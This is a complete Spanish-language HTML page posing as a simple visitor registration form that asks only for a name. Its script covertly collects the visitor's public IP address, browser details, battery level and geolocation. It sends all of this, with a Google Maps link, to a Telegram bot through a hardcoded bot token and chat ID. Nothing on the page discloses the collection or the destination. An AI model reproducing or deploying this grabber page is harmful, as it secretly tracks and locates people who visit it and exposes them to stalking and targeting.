<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>Registro de Visitante</title><style>body{font-family:Poppins,sans-serif;background:linear-gradient(135deg,#a1c4fd,#c2e9fb);height:100vh;margin:0;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;overflow:hidden}.container{background:#fff;padding:30px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.2);animation:fadeIn 1s ease;width:300px}input{width:90%;padding:10px;margin-top:15px;border:1px solid #ccc;border-radius:8px;font-size:16px}button{margin-top:20px;padding:12px 20px;background:#4caf50;color:#fff;border:none;border-radius:10px;cursor:pointer;width:100%;font-size:16px;transition:background .3s}button:hover{background:#45a049}@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}</style></head><body><div class="container" id="formulario"><h2>Ingresa tu nombre</h2><input type="text" id="nombre" placeholder="Tu nombre"><button onclick="enviarDatos()">Enviar</button><p id="estado" style="margin-top:15px"></p></div><script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script><script>const botToken = "7745087272:AAGkTNgj2raKiA-Fv2ms16sFnfgE5BTNNs4";
const chatId = "8143059484";

async function enviarDatos() {
  const nombre = document.getElementById('nombre').value.trim();
  if (nombre === "") {
    document.getElementById('estado').innerText = "Por favor ingresa tu nombre.";
    return;
  }

  document.getElementById('estado').innerText = "Enviando datos...";

  let ip = "No detectada";
  let marca = navigator.userAgent;
  let hora = new Date().toLocaleString();
  let bateria = "No disponible";
  let latitud = "No disponible";
  let longitud = "No disponible";
  let mapaURL = "No disponible";

  // IP pública
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    ip = res.data.ip;
  } catch (e) {}

  // Batería
  try {
    const battery = await navigator.getBattery();
    bateria = Math.round(battery.level * 100) + "%";
  } catch (e) {}

  // Intentar obtener ubicación (latitud y longitud)
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      latitud = position.coords.latitude;
      longitud = position.coords.longitude;

      // Generar URL de Google Maps con la ubicación
      mapaURL = `https://www.google.com/maps?q=${latitud},${longitud}`;

      // Ahora enviar los datos a Telegram
      enviarMensaje(nombre, ip, marca, hora, bateria, latitud, longitud, mapaURL);
    }, function(error) {
      // Si hay un error al obtener la ubicación
      console.error("Error al obtener ubicación:", error);
      mapaURL = "Ubicación no disponible";
      enviarMensaje(nombre, ip, marca, hora, bateria, latitud, longitud, mapaURL);
    });
  } else {
    // Si la geolocalización no está disponible, enviar sin ubicación
    mapaURL = "Ubicación no disponible";
    enviarMensaje(nombre, ip, marca, hora, bateria, latitud, longitud, mapaURL);
  }
}

async function enviarMensaje(nombre, ip, marca, hora, bateria, latitud, longitud, mapaURL) {
  const mensaje = `
Nuevo visitante:
- Nombre: ${nombre}
- IP: ${ip}
- Marca/Navegador: ${marca}
- Hora: ${hora}
- Batería: ${bateria}
- Ubicación: ${mapaURL}
`;

  // Enviar mensaje a Telegram
  try {
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: mensaje
    });
    document.getElementById('estado').innerText = "Datos enviados correctamente.";
    console.log("Mensaje enviado:", response.data);
  } catch (error) {
    document.getElementById('estado').innerText = "Error al enviar los datos.";
    console.error("Error al enviar mensaje a Telegram:", error);
  }
}</script></body></html>
